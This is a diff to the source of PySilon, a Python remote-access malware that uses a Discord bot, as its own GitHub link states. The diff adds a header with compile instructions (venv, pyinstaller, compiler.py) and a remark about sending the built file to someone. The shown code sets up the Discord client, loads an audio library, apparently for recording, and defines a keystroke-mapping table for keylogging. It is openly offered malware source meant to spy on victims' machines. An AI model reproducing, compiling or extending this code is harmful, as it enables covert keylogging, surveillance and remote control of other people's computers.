@@ -27,6 +27,39 @@ import winreg
 import sys
 import os
 
+#
+#
+#    READ BEFORE RUNNING!
+#
+#    1. If you run this script by interpreter (not built executable), uncomment Line-105.
+#    2. Don't insert or remove any line of code in this script, because that will produce errors in compiler.py
+#    3. Before you run this code or compile it or send to someone, read the Disclaimer (Line-65) carefully.
+#    4. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
+#  
+#
+#    HOW TO COMPILE:
+#
+#    python -m venv pysilon
+#    pysilon\Scripts\activate.bat
+#    pip install -r requirements.txt
+#    pip install pyinstaller
+#    python compiler.py
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
 ###############################################################################
 ##                                                                           ##
 ##   DISCLAIMER !!! READ BEFORE USING                                        ##
@@ -67,10 +100,9 @@ guild_id = None
 # -------------------------------------- #
 
 client = discord.Client(intents=discord.Intents.all())
-
 bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
-
+#opuslib_path = 'resources/libopus-0.x64.dll'
 discord.opus.load_opus(opuslib_path)
     
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
